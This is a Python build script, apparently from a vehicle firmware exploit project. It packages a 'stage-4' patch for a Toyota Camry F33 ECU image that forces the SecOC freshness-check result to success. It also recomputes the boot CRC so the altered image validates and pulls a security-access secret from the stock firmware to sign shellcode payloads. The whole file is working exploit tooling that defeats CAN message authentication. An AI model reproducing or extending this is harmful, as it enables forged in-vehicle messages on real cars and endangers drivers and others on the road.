#!/usr/bin/env python3
"""Build the exact-F33 stage-4 freshness-result bypass package.

Stage 4 starts from the live-proven CRC-valid stage-3 image.  In FUN_0008F746,
the B6 profile's freshness callback returns in r10 and 0x8F7E6 copies that
status to r27.  The immediately following dispatch treats r27==0 as the normal
freshness-accepted path; 0x22/0x23/0x24 take failure/recovery paths before the
crypto operation.  Replace only that result copy with `mov 0,r27`, preserving
instruction width and the callback itself.  Stage 3 then independently forces
the later ICU-S verify result to the native success path.
"""
from __future__ import annotations

import argparse
import copy
import hashlib
import json
import struct
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from exploit.patcher.build_payload import (
    build_authenticated_payload,
    build_configured_payload,
    inject_config,
    sha256_bytes,
    simulate_apply,
)
from exploit.patcher.patch_config import PatchConfigV1, config_from_manifest
from exploit.patcher.post_apply_verify import build_post_apply_validate_config
from tools import build_camry_f33_gate2_root_result_patch as stage3
from tools.build_secoc_patch_manifest import crc32

STOCK_IMAGE = stage3.STOCK_IMAGE
EXPECTED_STOCK_SHA256 = stage3.EXPECTED_STOCK_SHA256
EXPECTED_STAGE3_SHA256 = stage3.EXPECTED_FINAL_SHA256
EXPECTED_STAGE3_FIXUP = stage3.EXPECTED_STAGE3_FIXUP
EXPECTED_STAGE4_PREFIX = 0x7029A5F8
EXPECTED_STAGE4_FIXUP = 0x8FD65A07
EXPECTED_FINAL_SHA256 = "2e2f0819ab328b8733c604eee3952ba4f774e4344a60184b7eea99927236640e"
EXPECTED_TEMPLATE_SHA256 = stage3.EXPECTED_TEMPLATE_SHA256

FRESHNESS_RESULT_VA = 0x8F7E6
FRESHNESS_RESULT_ORIGINAL = bytes.fromhex("0ad8")  # mov r10,r27
FRESHNESS_RESULT_REPLACEMENT = bytes.fromhex("00da")  # mov 0,r27
PATCH_BLOCK_BASE = 0x88000
BOOT_SECRET_OFF = stage3.BOOT_SECRET_OFF
PAYLOAD_SECRET_OFF = stage3.PAYLOAD_SECRET_OFF
SECRET_LEN = stage3.SECRET_LEN
EXPECTED_F181_HEX = stage3.EXPECTED_F181_HEX
EXPECTED_BOOT_F181_HEX = stage3.EXPECTED_BOOT_F181_HEX
RAM_LOAD_ADDR = stage3.RAM_LOAD_ADDR


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _hex32(value: int) -> str:
    return f"0x{value:08X}"


def reconstruct_stage3(stock: bytes) -> tuple[bytes, dict[str, Any]]:
    if sha256(stock) != EXPECTED_STOCK_SHA256:
        raise ValueError("exact F33 stock CodeFlash SHA-256 mismatch")
    stage2_image, stage2_manifest = stage3.reconstruct_stage2(stock)
    stage3_manifest = stage3.build_stage3_manifest(stage2_image, stage2_manifest)
    cfg = config_from_manifest(stage3_manifest, mode="apply")
    stage3_image, fixup, residue = simulate_apply(stage2_image, cfg)
    if sha256(stage3_image) != EXPECTED_STAGE3_SHA256:
        raise ValueError("stage-3 reconstructed image SHA-256 drift")
    if fixup != EXPECTED_STAGE3_FIXUP or residue != 0xFFFFFFFF:
        raise ValueError("stage-3 reconstructed CRC/fixup drift")
    return stage3_image, stage3_manifest


def build_stage4_manifest(stage3_image: bytes, stage3_manifest: dict[str, Any]) -> dict[str, Any]:
    if stage3_image[FRESHNESS_RESULT_VA:FRESHNESS_RESULT_VA + 2] != FRESHNESS_RESULT_ORIGINAL:
        raise ValueError("stage-4 freshness-result preimage drift")
    # Exact local context: indirect freshness callback, copy result, then dispatch 0x22/0x24/0x23/0.
    if stage3_image[0x8F7E0:0x8F812] != bytes.fromhex(
        "1400f8c760f90ad81b06deffba0d200ea5ff20ce00015a0f00001c30bfff9afdb51d1b06dcffea05fd371300bfffecfdb515"
    ):
        raise ValueError("stage-4 freshness-return machine context drift")
    # Exact known same-width forced-zero encoding exists elsewhere in this image as `mov 0,r27`.
    if stage3_image[0x90C6E:0x90C70] != FRESHNESS_RESULT_REPLACEMENT:
        raise ValueError("RH850 mov 0,r27 reference encoding drift")
    # Current live source must retain all prior development edits.
    if stage3_image[stage3.ROOT_RESULT_VA:stage3.ROOT_RESULT_VA + 4] != stage3.ROOT_RESULT_REPLACEMENT:
        raise ValueError("stage-3 root-result patch missing")
    if stage3_image[stage3.STAGE2_CALLBACK_VA:stage3.STAGE2_CALLBACK_VA + 2] != stage3.STAGE2_CALLBACK_BYTES:
        raise ValueError("stage-2 callback patch missing")
    if stage3_image[stage3.STAGE1_GATE_VA:stage3.STAGE1_GATE_VA + 2] != stage3.STAGE1_GATE_BYTES:
        raise ValueError("stage-1 gate patch missing")

    manifest = copy.deepcopy(stage3_manifest)
    image_sha = sha256(stage3_image)
    manifest["image"] = {
        "base": "0x0",
        "path": "CodeFlash.gate2-stage3.bin",
        "sha256": image_sha,
        "size": len(stage3_image),
    }
    manifest["patch"] = {
        "address": f"0x{FRESHNESS_RESULT_VA:X}",
        "block_base": f"0x{PATCH_BLOCK_BASE:X}",
        "block_size": 0x8000,
        "original": FRESHNESS_RESULT_ORIGINAL.hex(),
        "preimage_verified": True,
        "replacement": FRESHNESS_RESULT_REPLACEMENT.hex(),
    }

    crc = manifest["boot_crc"]
    start = int(crc["start"], 0)
    end = int(crc["end"], 0)
    fixup_va = int(crc["fixup_va"], 0)
    source_prefix = crc32(stage3_image[start:fixup_va])
    source_fixup = int.from_bytes(stage3_image[fixup_va:fixup_va + 4], "little")
    source_residue = crc32(stage3_image[start:end])
    candidate = bytearray(stage3_image)
    candidate[FRESHNESS_RESULT_VA:FRESHNESS_RESULT_VA + 2] = FRESHNESS_RESULT_REPLACEMENT
    patched_prefix = crc32(candidate[start:fixup_va])
    patched_fixup = patched_prefix ^ 0xFFFFFFFF
    struct.pack_into("<I", candidate, fixup_va, patched_fixup)
    patched_residue = crc32(candidate[start:end])

    if source_fixup != EXPECTED_STAGE3_FIXUP or source_residue != 0xFFFFFFFF:
        raise ValueError("stage-4 source is not exact CRC-valid stage-3 image")
    if patched_prefix != EXPECTED_STAGE4_PREFIX:
        raise ValueError("stage-4 prefix CRC drift")
    if patched_fixup != EXPECTED_STAGE4_FIXUP or patched_residue != 0xFFFFFFFF:
        raise ValueError("stage-4 cumulative CRC repair drift")
    if sha256(bytes(candidate)) != EXPECTED_FINAL_SHA256:
        raise ValueError("stage-4 final image SHA-256 drift")

    crc.update({
        "stock_expected_fixup": _hex32(source_fixup),
        "stock_prefix_crc": _hex32(source_prefix),
        "stock_region_valid": True,
        "stock_residue": _hex32(source_residue),
        "stored_fixup": _hex32(source_fixup),
        "patched_prefix_crc_for_supplied_image": _hex32(patched_prefix),
        "patched_fixup_for_supplied_image": _hex32(patched_fixup),
        "patched_residue_for_supplied_image": _hex32(patched_residue),
        "live_policy": "recompute prefix CRC from exact live stage-3 CodeFlash after freshness-result target-block RMW; write complement at fixup VA; require final residue 0xFFFFFFFF",
    })
    manifest["semantic_resolution"] = {
        "schema": "toyota-secoc-freshness-result-target-v1",
        "resolution": "unique",
        "candidate_count": 1,
        "program_sha256": image_sha,
        "function": {"entry": "0x0008f746", "name": "FUN_0008f746"},
        "profile": {"secured_record": 2, "can_id": "0x0B6", "freshness_callback": "0x000903A0"},
        "patch": {
            "address": f"0x{FRESHNESS_RESULT_VA:08x}",
            "operation": "force-freshness-callback-result-zero",
            "original": FRESHNESS_RESULT_ORIGINAL.hex(),
            "replacement": FRESHNESS_RESULT_REPLACEMENT.hex(),
            "stock_instruction": "mov r10,r27",
            "replacement_instruction": "mov 0,r27",
            "instruction_width_preserved": True,
        },
        "native_success_equivalence": {
            "freshness_callback_still_runs": True,
            "freshness_status_used_by_dispatch": 0,
            "hard_0x22_failure_arm": "not taken",
            "0x24_recovery_arm": "not taken",
            "0x23_failure_arm": "not taken",
            "crypto_submit_path": "continues through existing FUN_0008ECB2 -> FUN_0008F676",
            "crypto_result_policy": "existing stage-3 0x8F930 root-result patch forces later ICU-S result boolean to zero",
        },
        "invariants": [
            "stage-4-source-is-exact-live-proven-stage-3-crc-valid-image",
            "B6 freshness callback remains invoked",
            "only callback return status copied into r27 is overridden",
            "replacement is exact same-width RH850 mov-immediate encoding",
            "downstream crypto construction/submission is unchanged",
            "stage-3 crypto-result root override remains present",
            "crc-repair covers all four persistent development edits",
        ],
    }
    manifest["safety"] = {
        "fail_closed": True,
        "requirements": [
            "exact stock F33 SHA-256 matches",
            "stage-3 source reconstructs through pinned stage-1/stage-2/stage-3 manifests",
            "stage-3 source SHA/fixup/residue match the reboot-verified live image contract",
            "0x8F7E6 preimage and complete freshness-result dispatch context match exactly",
            "all existing development patch bytes match the live stage-3 source",
            "live patcher recomputes cumulative CRC and requires final residue 0xFFFFFFFF",
            "programming-session operations are performed only in NRTD/Park/stationary state",
        ],
    }
    manifest["development_stage"] = {
        "name": "f33-freshness-result-stage4",
        "source_stage": "live-proven-stage3-root-result-image",
        "source_image_sha256": EXPECTED_STAGE3_SHA256,
        "source_fixup": _hex32(EXPECTED_STAGE3_FIXUP),
        "final_image_sha256": EXPECTED_FINAL_SHA256,
        "final_prefix_crc": _hex32(EXPECTED_STAGE4_PREFIX),
        "final_fixup": _hex32(EXPECTED_STAGE4_FIXUP),
        "cumulative_patch_sites": [
            {"address": "0x8F7E6", "bytes": FRESHNESS_RESULT_REPLACEMENT.hex()},
            {"address": "0x8F930", "bytes": stage3.ROOT_RESULT_REPLACEMENT.hex()},
            {"address": "0x8F948", "bytes": stage3.STAGE2_CALLBACK_BYTES.hex()},
            {"address": "0x8F952", "bytes": stage3.STAGE1_GATE_BYTES.hex()},
        ],
    }
    return manifest


def materialize_template(out: Path) -> Path:
    return stage3.materialize_template(out)


def build_post_apply_payload(*, source_image: bytes, manifest: dict[str, Any], template: bytes,
                             payload_secret: bytes, out: Path) -> dict[str, Any]:
    apply_cfg = config_from_manifest(manifest, mode="apply")
    final_image, expected_fixup, expected_residue = simulate_apply(source_image, apply_cfg)
    verify_cfg = PatchConfigV1.from_bytes(build_post_apply_validate_config(apply_cfg, final_image).to_bytes())
    shellcode = inject_config(template, verify_cfg)
    payload = build_authenticated_payload(shellcode, payload_secret, ram_load_addr=RAM_LOAD_ADDR)
    d = out / "post-apply"
    d.mkdir(parents=True, exist_ok=True)
    (d / "config-validate.bin").write_bytes(verify_cfg.to_bytes())
    (d / "shellcode-validate-only.bin").write_bytes(shellcode)
    (d / "payload-validate-only.bin").write_bytes(payload)
    start, end, fixup_va = apply_cfg.crc_start, apply_cfg.crc_end, apply_cfg.crc_fixup_va
    expected = {
        "patch_observed": int.from_bytes(final_image[FRESHNESS_RESULT_VA:FRESHNESS_RESULT_VA + 2], "little"),
        "fixup_stored": int.from_bytes(final_image[fixup_va:fixup_va + 4], "little"),
        "crc_prefix": crc32(final_image[start:fixup_va]),
        "crc_residue": crc32(final_image[start:end]),
    }
    meta = {
        "schema": "camry-f33-stage4-post-apply-v1",
        "final_image_sha256": sha256(final_image),
        "expected_fixup": _hex32(expected_fixup),
        "expected_residue": _hex32(expected_residue),
        "expected_preflight": {k: _hex32(v) for k, v in expected.items()},
        "config_sha256": sha256_bytes(verify_cfg.to_bytes()),
        "shellcode_sha256": sha256_bytes(shellcode),
        "payload_sha256": sha256_bytes(payload),
    }
    (d / "manifest.json").write_text(json.dumps(meta, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return meta


def build(out: Path, *, build_payloads: bool = True) -> dict[str, Any]:
    out.mkdir(parents=True, exist_ok=True)
    stock = STOCK_IMAGE.read_bytes()
    source, stage3_manifest = reconstruct_stage3(stock)
    source_path = out / "CodeFlash.gate2-stage3.bin"
    source_path.write_bytes(source)
    manifest = build_stage4_manifest(source, stage3_manifest)
    manifest_path = out / "secoc_patch_manifest_f33_freshness_result.json"
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    result: dict[str, Any] = {
        "schema": "camry-f33-freshness-result-stage4-package-v1",
        "source_image": {"path": source_path.name, "sha256": sha256(source), "size": len(source)},
        "manifest": {"path": manifest_path.name, "sha256": sha256(manifest_path.read_bytes())},
        "stage4": {"address": "0x8F7E6", "bytes": FRESHNESS_RESULT_REPLACEMENT.hex(), "fixup": _hex32(EXPECTED_STAGE4_FIXUP)},
        "final_image_sha256": EXPECTED_FINAL_SHA256,
        "expected_f181_hex": EXPECTED_F181_HEX,
        "expected_boot_f181_hex": EXPECTED_BOOT_F181_HEX,
        "payloads_built": build_payloads,
    }

    if build_payloads:
        template_path = materialize_template(out)
        template = template_path.read_bytes()
        payload_secret = stock[PAYLOAD_SECRET_OFF:PAYLOAD_SECRET_OFF + SECRET_LEN]
        if len(payload_secret) != SECRET_LEN:
            raise ValueError("payload-build secret range truncated")
        preflight_path = out / "payload-validate-only.bin"
        preflight_meta = build_configured_payload(
            image_path=source_path, manifest_path=manifest_path, template_path=template_path,
            mode="validate-only", output_path=preflight_path, payload_secret=payload_secret,
            software_id="8965F3307000", ram_load_addr=RAM_LOAD_ADDR,
        )
        apply_path = out / "payload-apply.bin"
        apply_meta = build_configured_payload(
            image_path=source_path, manifest_path=manifest_path, template_path=template_path,
            mode="apply", output_path=apply_path, payload_secret=payload_secret,
            restore_dir=out / "restore", software_id="8965F3307000", ram_load_addr=RAM_LOAD_ADDR,
        )
        post_meta = build_post_apply_payload(
            source_image=source, manifest=manifest, template=template,
            payload_secret=payload_secret, out=out,
        )
        result["template"] = {"path": template_path.name, "sha256": EXPECTED_TEMPLATE_SHA256}
        result["payloads"] = {
            "preflight": preflight_meta["payload"],
            "apply": apply_meta["payload"],
            "restore": apply_meta["restore_artifact"],
            "post_apply": post_meta,
        }
        result["security_access"] = {
            "source": "exact F33 stock CodeFlash source image",
            "offset": f"0x{BOOT_SECRET_OFF:X}",
            "length": SECRET_LEN,
            "secret_value_recorded": False,
        }

    package_path = out / "package.json"
    package_path.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--out", type=Path, default=ROOT / "build/out/f33-freshness-result-stage4")
    p.add_argument("--no-payloads", action="store_true")
    args = p.parse_args()
    result = build(args.out, build_payloads=not args.no_payloads)
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
